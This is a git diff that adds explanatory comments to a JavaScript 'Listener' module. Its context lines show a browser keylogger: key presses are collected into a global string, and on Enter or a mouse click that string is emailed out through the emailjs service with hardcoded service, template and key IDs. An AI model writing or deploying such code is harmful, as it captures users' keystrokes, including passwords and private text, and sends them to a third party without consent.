@@ -6,6 +6,7 @@ var emailParams = {}
 export default function Listener() {
 
     /**
+     * Tracks key presses and adds the data to the global 'keyString' variable
      * @param {event} keypress event 
      */
     function buildKeyString (e) {
@@ -23,6 +24,7 @@ export default function Listener() {
     })
 
     /**
+     * This function calls the function that sends the email once the enter key is pressed, but only if there is content added to the global 'keyString', so as to avoid sending emails with no data
      * @param {event} keyup event
      */
     function sendStringEnter (e) {
@@ -44,6 +46,7 @@ export default function Listener() {
     })
 
     /**
+     * This function calls the function that sends the email once a mouse key is clicked, but only if there is content added to the global 'keyString', so as to avoid sending emails with no data
      * @param {event} mouseup event
      */
     function sendStringClick (e) {
@@ -65,6 +68,7 @@ export default function Listener() {
     })
 
     /**
+     * Sends an email via the emailjs module
      */
     const sendEmail = () => {
         emailjs.send('service_s18ykma', 'template_17h4bou', emailParams, '51g4O0_Fg41v4jTW0')
